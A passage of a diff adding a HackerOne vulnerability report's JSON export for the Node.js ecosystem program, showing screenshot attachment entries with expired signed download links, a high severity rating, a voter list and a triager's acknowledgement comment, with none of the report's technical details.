+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/539/735/ec06901edc3e787a98506c11f656b2dafcb9d3df/screen_5.png?response-content-disposition=attachment%3B%20filename%3D%22screen_5.png%22%3B%20filename%2A%3DUTF-8%27%27screen_5.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWZRWVQLW%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T073320Z&X-Amz-Expires=1345&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIH4h5RU%2BpbI3mlwEISZD1G9BopBv%2B7sztLbJknQb99SoAiEAvhxLWqtVFV73maMS53mFspg5vBZ3%2BzoNHXmSke7DMlAqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDC7pogsWvzjWL290gCqPBTKeeZOA278oY6KnHe%2FmWuxZ3Qva3oIxiPgSeceppHqQhkbgfD3tsY8pCoJ9VsxHzSlUT0PRdOuJ8sr7ZKZL2JXBIQSfFD%2FndZi2qU1cFtihzUpwWYUUNN5iSpcUDdb5QDC4CvgOQ%2BEvd6tX7y%2F6Q%2BSMOg8q7yp5mzJr5qbY%2BWMbL6nz%2Buay4cd0wnSe6tkjuaJ1NIbjxSdH9CbkBS0XoTSgIOBDeBGuSMPeOJAc2qCCwB3%2FJJzjHbb07dimFwcVQ37AzR3aSdVTIrEy7NTVExSsa71AnpdGMfq2ZWxbVHT4Z6Ep3h5g9prjvXQKlNKYdiX%2BmlPln5qCDc8s7M8gON6CdSii7fH0aBOcu0INjoa4dc%2FOKcwiuirhI9fDfGn4h4w3t9xVEOfQ21OzAu6iCzqwbyX6FcQTYmc1%2FIb4Lr%2BmfHmZPXpM41HYMK9XHVWPs5aSmF5nYp0DtlX53W%2FJIPEUayublSARs02HeVHIz1vwC6fhS3x1128WqIIvz2dgsHmVJmC%2Bi%2BMemNKEsdiaq0lMgNiTe9mDem3SLrvYMO99wYuebZUfCAVBbqea6mN0o6TtPR%2BY4ZiZl0Y57HEgt3yLwEJQ3BmwdmweldY92DYxW1o1ozabvAsUO6MT%2BEI0mkI2tmtaZQ%2B31bwtxLouobN%2FxkZiIs9YPexJAJ6%2F1%2BFYr5HPRh8rib2vpmO4ylsOFgCISJP5yPdziLDBPihHZhMx8CE858zkJIqVtEFfXZ31W%2FNw09acXa5I4%2BC8AMnDBWV%2FqsryQDDwWpVkzUyRJroktjLT8m7IUEVkEXb7s2GO%2BJiidEBoinU5YgVGpMWTmAmcjaFhRA%2FpwdFI%2F7XHri8KUlyGWMlbYK2BDuF74uow5IK5qAY6sQGceMO9KGy75rSGSK9Jhffgp6ECN8Mwct472Z1JRwqPxCECpo4hAM%2BTiqPzt7Rc8yOTYkRKOicKyCebEt1uytTR6HQoyEcj%2FTBDmV%2BwTAA3FljzwsKBDHTaYj%2Bd0h8rsm4W%2BKtqjUgQ%2BsI4FzYNCv9BSWMF%2FnJ7wV%2BwaSDW1OYbdFVrBpkgTxJPCiLvqlbbKjcH%2BuE8HtSqJR%2FjUt%2Bvxx4CmAPJl%2BJDFQWASMAeV4kuGCM%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8bdbc9ec43bb4772e8274ea5d27d9fdf8919daff0301affb311b11cd800011f4",
+      "file_size": 6420,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 539736,
+      "file_name": "screen_6.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/539/736/5135895622dadd5e80418d50d4e838e4a31f48d5/screen_6.png?response-content-disposition=attachment%3B%20filename%3D%22screen_6.png%22%3B%20filename%2A%3DUTF-8%27%27screen_6.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWZRWVQLW%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T073320Z&X-Amz-Expires=1345&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIH4h5RU%2BpbI3mlwEISZD1G9BopBv%2B7sztLbJknQb99SoAiEAvhxLWqtVFV73maMS53mFspg5vBZ3%2BzoNHXmSke7DMlAqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDC7pogsWvzjWL290gCqPBTKeeZOA278oY6KnHe%2FmWuxZ3Qva3oIxiPgSeceppHqQhkbgfD3tsY8pCoJ9VsxHzSlUT0PRdOuJ8sr7ZKZL2JXBIQSfFD%2FndZi2qU1cFtihzUpwWYUUNN5iSpcUDdb5QDC4CvgOQ%2BEvd6tX7y%2F6Q%2BSMOg8q7yp5mzJr5qbY%2BWMbL6nz%2Buay4cd0wnSe6tkjuaJ1NIbjxSdH9CbkBS0XoTSgIOBDeBGuSMPeOJAc2qCCwB3%2FJJzjHbb07dimFwcVQ37AzR3aSdVTIrEy7NTVExSsa71AnpdGMfq2ZWxbVHT4Z6Ep3h5g9prjvXQKlNKYdiX%2BmlPln5qCDc8s7M8gON6CdSii7fH0aBOcu0INjoa4dc%2FOKcwiuirhI9fDfGn4h4w3t9xVEOfQ21OzAu6iCzqwbyX6FcQTYmc1%2FIb4Lr%2BmfHmZPXpM41HYMK9XHVWPs5aSmF5nYp0DtlX53W%2FJIPEUayublSARs02HeVHIz1vwC6fhS3x1128WqIIvz2dgsHmVJmC%2Bi%2BMemNKEsdiaq0lMgNiTe9mDem3SLrvYMO99wYuebZUfCAVBbqea6mN0o6TtPR%2BY4ZiZl0Y57HEgt3yLwEJQ3BmwdmweldY92DYxW1o1ozabvAsUO6MT%2BEI0mkI2tmtaZQ%2B31bwtxLouobN%2FxkZiIs9YPexJAJ6%2F1%2BFYr5HPRh8rib2vpmO4ylsOFgCISJP5yPdziLDBPihHZhMx8CE858zkJIqVtEFfXZ31W%2FNw09acXa5I4%2BC8AMnDBWV%2FqsryQDDwWpVkzUyRJroktjLT8m7IUEVkEXb7s2GO%2BJiidEBoinU5YgVGpMWTmAmcjaFhRA%2FpwdFI%2F7XHri8KUlyGWMlbYK2BDuF74uow5IK5qAY6sQGceMO9KGy75rSGSK9Jhffgp6ECN8Mwct472Z1JRwqPxCECpo4hAM%2BTiqPzt7Rc8yOTYkRKOicKyCebEt1uytTR6HQoyEcj%2FTBDmV%2BwTAA3FljzwsKBDHTaYj%2Bd0h8rsm4W%2BKtqjUgQ%2BsI4FzYNCv9BSWMF%2FnJ7wV%2BwaSDW1OYbdFVrBpkgTxJPCiLvqlbbKjcH%2BuE8HtSqJR%2FjUt%2Bvxx4CmAPJl%2BJDFQWASMAeV4kuGCM%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9ffa02cb7d9cf91d5a7351cef11fc625104013bd10359cc2d7b3df00b134a685",
+      "file_size": 18837,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 539737,
+      "file_name": "screen_7.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/539/737/55eb919594e37cbcb27704ead50169081ec72e94/screen_7.png?response-content-disposition=attachment%3B%20filename%3D%22screen_7.png%22%3B%20filename%2A%3DUTF-8%27%27screen_7.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWZRWVQLW%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T073320Z&X-Amz-Expires=1345&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIH4h5RU%2BpbI3mlwEISZD1G9BopBv%2B7sztLbJknQb99SoAiEAvhxLWqtVFV73maMS53mFspg5vBZ3%2BzoNHXmSke7DMlAqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDC7pogsWvzjWL290gCqPBTKeeZOA278oY6KnHe%2FmWuxZ3Qva3oIxiPgSeceppHqQhkbgfD3tsY8pCoJ9VsxHzSlUT0PRdOuJ8sr7ZKZL2JXBIQSfFD%2FndZi2qU1cFtihzUpwWYUUNN5iSpcUDdb5QDC4CvgOQ%2BEvd6tX7y%2F6Q%2BSMOg8q7yp5mzJr5qbY%2BWMbL6nz%2Buay4cd0wnSe6tkjuaJ1NIbjxSdH9CbkBS0XoTSgIOBDeBGuSMPeOJAc2qCCwB3%2FJJzjHbb07dimFwcVQ37AzR3aSdVTIrEy7NTVExSsa71AnpdGMfq2ZWxbVHT4Z6Ep3h5g9prjvXQKlNKYdiX%2BmlPln5qCDc8s7M8gON6CdSii7fH0aBOcu0INjoa4dc%2FOKcwiuirhI9fDfGn4h4w3t9xVEOfQ21OzAu6iCzqwbyX6FcQTYmc1%2FIb4Lr%2BmfHmZPXpM41HYMK9XHVWPs5aSmF5nYp0DtlX53W%2FJIPEUayublSARs02HeVHIz1vwC6fhS3x1128WqIIvz2dgsHmVJmC%2Bi%2BMemNKEsdiaq0lMgNiTe9mDem3SLrvYMO99wYuebZUfCAVBbqea6mN0o6TtPR%2BY4ZiZl0Y57HEgt3yLwEJQ3BmwdmweldY92DYxW1o1ozabvAsUO6MT%2BEI0mkI2tmtaZQ%2B31bwtxLouobN%2FxkZiIs9YPexJAJ6%2F1%2BFYr5HPRh8rib2vpmO4ylsOFgCISJP5yPdziLDBPihHZhMx8CE858zkJIqVtEFfXZ31W%2FNw09acXa5I4%2BC8AMnDBWV%2FqsryQDDwWpVkzUyRJroktjLT8m7IUEVkEXb7s2GO%2BJiidEBoinU5YgVGpMWTmAmcjaFhRA%2FpwdFI%2F7XHri8KUlyGWMlbYK2BDuF74uow5IK5qAY6sQGceMO9KGy75rSGSK9Jhffgp6ECN8Mwct472Z1JRwqPxCECpo4hAM%2BTiqPzt7Rc8yOTYkRKOicKyCebEt1uytTR6HQoyEcj%2FTBDmV%2BwTAA3FljzwsKBDHTaYj%2Bd0h8rsm4W%2BKtqjUgQ%2BsI4FzYNCv9BSWMF%2FnJ7wV%2BwaSDW1OYbdFVrBpkgTxJPCiLvqlbbKjcH%2BuE8HtSqJR%2FjUt%2Bvxx4CmAPJl%2BJDFQWASMAeV4kuGCM%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=45ec973af68e0abcad2801d8dd99a015c0dc322c64fc3c8a4109e6c345d59b5a",
+      "file_size": 6599,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 539738,
+      "file_name": "screen_8.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/539/738/fc5d99368893d134234ed1004960d70d5e0075b8/screen_8.png?response-content-disposition=attachment%3B%20filename%3D%22screen_8.png%22%3B%20filename%2A%3DUTF-8%27%27screen_8.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWZRWVQLW%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T073320Z&X-Amz-Expires=1345&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIH4h5RU%2BpbI3mlwEISZD1G9BopBv%2B7sztLbJknQb99SoAiEAvhxLWqtVFV73maMS53mFspg5vBZ3%2BzoNHXmSke7DMlAqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDC7pogsWvzjWL290gCqPBTKeeZOA278oY6KnHe%2FmWuxZ3Qva3oIxiPgSeceppHqQhkbgfD3tsY8pCoJ9VsxHzSlUT0PRdOuJ8sr7ZKZL2JXBIQSfFD%2FndZi2qU1cFtihzUpwWYUUNN5iSpcUDdb5QDC4CvgOQ%2BEvd6tX7y%2F6Q%2BSMOg8q7yp5mzJr5qbY%2BWMbL6nz%2Buay4cd0wnSe6tkjuaJ1NIbjxSdH9CbkBS0XoTSgIOBDeBGuSMPeOJAc2qCCwB3%2FJJzjHbb07dimFwcVQ37AzR3aSdVTIrEy7NTVExSsa71AnpdGMfq2ZWxbVHT4Z6Ep3h5g9prjvXQKlNKYdiX%2BmlPln5qCDc8s7M8gON6CdSii7fH0aBOcu0INjoa4dc%2FOKcwiuirhI9fDfGn4h4w3t9xVEOfQ21OzAu6iCzqwbyX6FcQTYmc1%2FIb4Lr%2BmfHmZPXpM41HYMK9XHVWPs5aSmF5nYp0DtlX53W%2FJIPEUayublSARs02HeVHIz1vwC6fhS3x1128WqIIvz2dgsHmVJmC%2Bi%2BMemNKEsdiaq0lMgNiTe9mDem3SLrvYMO99wYuebZUfCAVBbqea6mN0o6TtPR%2BY4ZiZl0Y57HEgt3yLwEJQ3BmwdmweldY92DYxW1o1ozabvAsUO6MT%2BEI0mkI2tmtaZQ%2B31bwtxLouobN%2FxkZiIs9YPexJAJ6%2F1%2BFYr5HPRh8rib2vpmO4ylsOFgCISJP5yPdziLDBPihHZhMx8CE858zkJIqVtEFfXZ31W%2FNw09acXa5I4%2BC8AMnDBWV%2FqsryQDDwWpVkzUyRJroktjLT8m7IUEVkEXb7s2GO%2BJiidEBoinU5YgVGpMWTmAmcjaFhRA%2FpwdFI%2F7XHri8KUlyGWMlbYK2BDuF74uow5IK5qAY6sQGceMO9KGy75rSGSK9Jhffgp6ECN8Mwct472Z1JRwqPxCECpo4hAM%2BTiqPzt7Rc8yOTYkRKOicKyCebEt1uytTR6HQoyEcj%2FTBDmV%2BwTAA3FljzwsKBDHTaYj%2Bd0h8rsm4W%2BKtqjUgQ%2BsI4FzYNCv9BSWMF%2FnJ7wV%2BwaSDW1OYbdFVrBpkgTxJPCiLvqlbbKjcH%2BuE8HtSqJR%2FjUt%2Bvxx4CmAPJl%2BJDFQWASMAeV4kuGCM%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2194d3770296d2214f2c1f43a4eb66f765d968b255f56d65d6c3ee0b3d4f6b5b",
+      "file_size": 70381,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 539739,
+      "file_name": "screen_9.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/539/739/f0a0a5480f9a580158eb6476577b459feeb1d9ec/screen_9.png?response-content-disposition=attachment%3B%20filename%3D%22screen_9.png%22%3B%20filename%2A%3DUTF-8%27%27screen_9.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWZRWVQLW%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T073320Z&X-Amz-Expires=1345&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIH4h5RU%2BpbI3mlwEISZD1G9BopBv%2B7sztLbJknQb99SoAiEAvhxLWqtVFV73maMS53mFspg5vBZ3%2BzoNHXmSke7DMlAqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDC7pogsWvzjWL290gCqPBTKeeZOA278oY6KnHe%2FmWuxZ3Qva3oIxiPgSeceppHqQhkbgfD3tsY8pCoJ9VsxHzSlUT0PRdOuJ8sr7ZKZL2JXBIQSfFD%2FndZi2qU1cFtihzUpwWYUUNN5iSpcUDdb5QDC4CvgOQ%2BEvd6tX7y%2F6Q%2BSMOg8q7yp5mzJr5qbY%2BWMbL6nz%2Buay4cd0wnSe6tkjuaJ1NIbjxSdH9CbkBS0XoTSgIOBDeBGuSMPeOJAc2qCCwB3%2FJJzjHbb07dimFwcVQ37AzR3aSdVTIrEy7NTVExSsa71AnpdGMfq2ZWxbVHT4Z6Ep3h5g9prjvXQKlNKYdiX%2BmlPln5qCDc8s7M8gON6CdSii7fH0aBOcu0INjoa4dc%2FOKcwiuirhI9fDfGn4h4w3t9xVEOfQ21OzAu6iCzqwbyX6FcQTYmc1%2FIb4Lr%2BmfHmZPXpM41HYMK9XHVWPs5aSmF5nYp0DtlX53W%2FJIPEUayublSARs02HeVHIz1vwC6fhS3x1128WqIIvz2dgsHmVJmC%2Bi%2BMemNKEsdiaq0lMgNiTe9mDem3SLrvYMO99wYuebZUfCAVBbqea6mN0o6TtPR%2BY4ZiZl0Y57HEgt3yLwEJQ3BmwdmweldY92DYxW1o1ozabvAsUO6MT%2BEI0mkI2tmtaZQ%2B31bwtxLouobN%2FxkZiIs9YPexJAJ6%2F1%2BFYr5HPRh8rib2vpmO4ylsOFgCISJP5yPdziLDBPihHZhMx8CE858zkJIqVtEFfXZ31W%2FNw09acXa5I4%2BC8AMnDBWV%2FqsryQDDwWpVkzUyRJroktjLT8m7IUEVkEXb7s2GO%2BJiidEBoinU5YgVGpMWTmAmcjaFhRA%2FpwdFI%2F7XHri8KUlyGWMlbYK2BDuF74uow5IK5qAY6sQGceMO9KGy75rSGSK9Jhffgp6ECN8Mwct472Z1JRwqPxCECpo4hAM%2BTiqPzt7Rc8yOTYkRKOicKyCebEt1uytTR6HQoyEcj%2FTBDmV%2BwTAA3FljzwsKBDHTaYj%2Bd0h8rsm4W%2BKtqjUgQ%2BsI4FzYNCv9BSWMF%2FnJ7wV%2BwaSDW1OYbdFVrBpkgTxJPCiLvqlbbKjcH%2BuE8HtSqJR%2FjUt%2Bvxx4CmAPJl%2BJDFQWASMAeV4kuGCM%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e6db652d3a3b5e58c724295fd1fb004e380a639a200b4b9d333c978eacdd7f70",
+      "file_size": 63205,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 539740,
+      "file_name": "pwn.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/539/740/e0dbef4b6affd485c0228a345cf2b163af9777fd/pwn.png?response-content-disposition=attachment%3B%20filename%3D%22pwn.png%22%3B%20filename%2A%3DUTF-8%27%27pwn.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWZRWVQLW%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T073320Z&X-Amz-Expires=1345&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIH4h5RU%2BpbI3mlwEISZD1G9BopBv%2B7sztLbJknQb99SoAiEAvhxLWqtVFV73maMS53mFspg5vBZ3%2BzoNHXmSke7DMlAqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDC7pogsWvzjWL290gCqPBTKeeZOA278oY6KnHe%2FmWuxZ3Qva3oIxiPgSeceppHqQhkbgfD3tsY8pCoJ9VsxHzSlUT0PRdOuJ8sr7ZKZL2JXBIQSfFD%2FndZi2qU1cFtihzUpwWYUUNN5iSpcUDdb5QDC4CvgOQ%2BEvd6tX7y%2F6Q%2BSMOg8q7yp5mzJr5qbY%2BWMbL6nz%2Buay4cd0wnSe6tkjuaJ1NIbjxSdH9CbkBS0XoTSgIOBDeBGuSMPeOJAc2qCCwB3%2FJJzjHbb07dimFwcVQ37AzR3aSdVTIrEy7NTVExSsa71AnpdGMfq2ZWxbVHT4Z6Ep3h5g9prjvXQKlNKYdiX%2BmlPln5qCDc8s7M8gON6CdSii7fH0aBOcu0INjoa4dc%2FOKcwiuirhI9fDfGn4h4w3t9xVEOfQ21OzAu6iCzqwbyX6FcQTYmc1%2FIb4Lr%2BmfHmZPXpM41HYMK9XHVWPs5aSmF5nYp0DtlX53W%2FJIPEUayublSARs02HeVHIz1vwC6fhS3x1128WqIIvz2dgsHmVJmC%2Bi%2BMemNKEsdiaq0lMgNiTe9mDem3SLrvYMO99wYuebZUfCAVBbqea6mN0o6TtPR%2BY4ZiZl0Y57HEgt3yLwEJQ3BmwdmweldY92DYxW1o1ozabvAsUO6MT%2BEI0mkI2tmtaZQ%2B31bwtxLouobN%2FxkZiIs9YPexJAJ6%2F1%2BFYr5HPRh8rib2vpmO4ylsOFgCISJP5yPdziLDBPihHZhMx8CE858zkJIqVtEFfXZ31W%2FNw09acXa5I4%2BC8AMnDBWV%2FqsryQDDwWpVkzUyRJroktjLT8m7IUEVkEXb7s2GO%2BJiidEBoinU5YgVGpMWTmAmcjaFhRA%2FpwdFI%2F7XHri8KUlyGWMlbYK2BDuF74uow5IK5qAY6sQGceMO9KGy75rSGSK9Jhffgp6ECN8Mwct472Z1JRwqPxCECpo4hAM%2BTiqPzt7Rc8yOTYkRKOicKyCebEt1uytTR6HQoyEcj%2FTBDmV%2BwTAA3FljzwsKBDHTaYj%2Bd0h8rsm4W%2BKtqjUgQ%2BsI4FzYNCv9BSWMF%2FnJ7wV%2BwaSDW1OYbdFVrBpkgTxJPCiLvqlbbKjcH%2BuE8HtSqJR%2FjUt%2Bvxx4CmAPJl%2BJDFQWASMAeV4kuGCM%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f6dba4ae1484d0904feea88f55071077d38f216da31b750f8dcbc6ab802bce2f",
+      "file_size": 59019,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 539741,
+      "file_name": "12354.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/539/741/fa2a05e74e47e34935006c90d4cb0dc47a9576e9/12354.png?response-content-disposition=attachment%3B%20filename%3D%2212354.png%22%3B%20filename%2A%3DUTF-8%27%2712354.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWZRWVQLW%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T073320Z&X-Amz-Expires=1345&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIH4h5RU%2BpbI3mlwEISZD1G9BopBv%2B7sztLbJknQb99SoAiEAvhxLWqtVFV73maMS53mFspg5vBZ3%2BzoNHXmSke7DMlAqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDC7pogsWvzjWL290gCqPBTKeeZOA278oY6KnHe%2FmWuxZ3Qva3oIxiPgSeceppHqQhkbgfD3tsY8pCoJ9VsxHzSlUT0PRdOuJ8sr7ZKZL2JXBIQSfFD%2FndZi2qU1cFtihzUpwWYUUNN5iSpcUDdb5QDC4CvgOQ%2BEvd6tX7y%2F6Q%2BSMOg8q7yp5mzJr5qbY%2BWMbL6nz%2Buay4cd0wnSe6tkjuaJ1NIbjxSdH9CbkBS0XoTSgIOBDeBGuSMPeOJAc2qCCwB3%2FJJzjHbb07dimFwcVQ37AzR3aSdVTIrEy7NTVExSsa71AnpdGMfq2ZWxbVHT4Z6Ep3h5g9prjvXQKlNKYdiX%2BmlPln5qCDc8s7M8gON6CdSii7fH0aBOcu0INjoa4dc%2FOKcwiuirhI9fDfGn4h4w3t9xVEOfQ21OzAu6iCzqwbyX6FcQTYmc1%2FIb4Lr%2BmfHmZPXpM41HYMK9XHVWPs5aSmF5nYp0DtlX53W%2FJIPEUayublSARs02HeVHIz1vwC6fhS3x1128WqIIvz2dgsHmVJmC%2Bi%2BMemNKEsdiaq0lMgNiTe9mDem3SLrvYMO99wYuebZUfCAVBbqea6mN0o6TtPR%2BY4ZiZl0Y57HEgt3yLwEJQ3BmwdmweldY92DYxW1o1ozabvAsUO6MT%2BEI0mkI2tmtaZQ%2B31bwtxLouobN%2FxkZiIs9YPexJAJ6%2F1%2BFYr5HPRh8rib2vpmO4ylsOFgCISJP5yPdziLDBPihHZhMx8CE858zkJIqVtEFfXZ31W%2FNw09acXa5I4%2BC8AMnDBWV%2FqsryQDDwWpVkzUyRJroktjLT8m7IUEVkEXb7s2GO%2BJiidEBoinU5YgVGpMWTmAmcjaFhRA%2FpwdFI%2F7XHri8KUlyGWMlbYK2BDuF74uow5IK5qAY6sQGceMO9KGy75rSGSK9Jhffgp6ECN8Mwct472Z1JRwqPxCECpo4hAM%2BTiqPzt7Rc8yOTYkRKOicKyCebEt1uytTR6HQoyEcj%2FTBDmV%2BwTAA3FljzwsKBDHTaYj%2Bd0h8rsm4W%2BKtqjUgQ%2BsI4FzYNCv9BSWMF%2FnJ7wV%2BwaSDW1OYbdFVrBpkgTxJPCiLvqlbbKjcH%2BuE8HtSqJR%2FjUt%2Bvxx4CmAPJl%2BJDFQWASMAeV4kuGCM%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8247ac5b0dbe88c2e8748fd6239e3222b949340f3fc76dd0199a0abf0f0010c5",
+      "file_size": 2048,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 539742,
+      "file_name": "screen3_1.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/539/742/c4aca7f0e1feb03a46e61279e411989facf465ca/screen3_1.png?response-content-disposition=attachment%3B%20filename%3D%22screen3_1.png%22%3B%20filename%2A%3DUTF-8%27%27screen3_1.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWZRWVQLW%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T073320Z&X-Amz-Expires=1345&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIH4h5RU%2BpbI3mlwEISZD1G9BopBv%2B7sztLbJknQb99SoAiEAvhxLWqtVFV73maMS53mFspg5vBZ3%2BzoNHXmSke7DMlAqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDC7pogsWvzjWL290gCqPBTKeeZOA278oY6KnHe%2FmWuxZ3Qva3oIxiPgSeceppHqQhkbgfD3tsY8pCoJ9VsxHzSlUT0PRdOuJ8sr7ZKZL2JXBIQSfFD%2FndZi2qU1cFtihzUpwWYUUNN5iSpcUDdb5QDC4CvgOQ%2BEvd6tX7y%2F6Q%2BSMOg8q7yp5mzJr5qbY%2BWMbL6nz%2Buay4cd0wnSe6tkjuaJ1NIbjxSdH9CbkBS0XoTSgIOBDeBGuSMPeOJAc2qCCwB3%2FJJzjHbb07dimFwcVQ37AzR3aSdVTIrEy7NTVExSsa71AnpdGMfq2ZWxbVHT4Z6Ep3h5g9prjvXQKlNKYdiX%2BmlPln5qCDc8s7M8gON6CdSii7fH0aBOcu0INjoa4dc%2FOKcwiuirhI9fDfGn4h4w3t9xVEOfQ21OzAu6iCzqwbyX6FcQTYmc1%2FIb4Lr%2BmfHmZPXpM41HYMK9XHVWPs5aSmF5nYp0DtlX53W%2FJIPEUayublSARs02HeVHIz1vwC6fhS3x1128WqIIvz2dgsHmVJmC%2Bi%2BMemNKEsdiaq0lMgNiTe9mDem3SLrvYMO99wYuebZUfCAVBbqea6mN0o6TtPR%2BY4ZiZl0Y57HEgt3yLwEJQ3BmwdmweldY92DYxW1o1ozabvAsUO6MT%2BEI0mkI2tmtaZQ%2B31bwtxLouobN%2FxkZiIs9YPexJAJ6%2F1%2BFYr5HPRh8rib2vpmO4ylsOFgCISJP5yPdziLDBPihHZhMx8CE858zkJIqVtEFfXZ31W%2FNw09acXa5I4%2BC8AMnDBWV%2FqsryQDDwWpVkzUyRJroktjLT8m7IUEVkEXb7s2GO%2BJiidEBoinU5YgVGpMWTmAmcjaFhRA%2FpwdFI%2F7XHri8KUlyGWMlbYK2BDuF74uow5IK5qAY6sQGceMO9KGy75rSGSK9Jhffgp6ECN8Mwct472Z1JRwqPxCECpo4hAM%2BTiqPzt7Rc8yOTYkRKOicKyCebEt1uytTR6HQoyEcj%2FTBDmV%2BwTAA3FljzwsKBDHTaYj%2Bd0h8rsm4W%2BKtqjUgQ%2BsI4FzYNCv9BSWMF%2FnJ7wV%2BwaSDW1OYbdFVrBpkgTxJPCiLvqlbbKjcH%2BuE8HtSqJR%2FjUt%2Bvxx4CmAPJl%2BJDFQWASMAeV4kuGCM%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e4e7a1492b44b1efc6e6fe3b502196a291dc5b97b0e6d95043d8bd28757ae285",
+      "file_size": 8829,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-03-08T15:23:15.708Z",
+  "allow_singular_disclosure_after": -111773404.30535696,
+  "singular_disclosure_allowed": true,
+  "vote_count": 8,
+  "voters": [
+    "a_d_a_m",
+    "bl4de",
+    "4xrhd",
+    "b9372d4605459ca97219795",
+    "alexander-petree1001",
+    "joshideepak",
+    "pumpkin_king",
+    "masq31"
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.0,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "high",
+      "privileges_required": "high",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 2986,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "Other module",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 5451284,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @inkz \n\nThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nKind regards,\n@ktistai",
+      "automated_response": false,
+      "created_at": "2019-07-29T09:24:28.058Z",
+      "updated_at": "2019-07-29T09:24:28.058Z",
+      "actor": {
+        "username": "ktistai",
+        "cleared": false,
+        "verified": false,
+        "url": "/ktistai",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/322/520/01cd21dce301646646276fd9125cffd448fbffd6_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
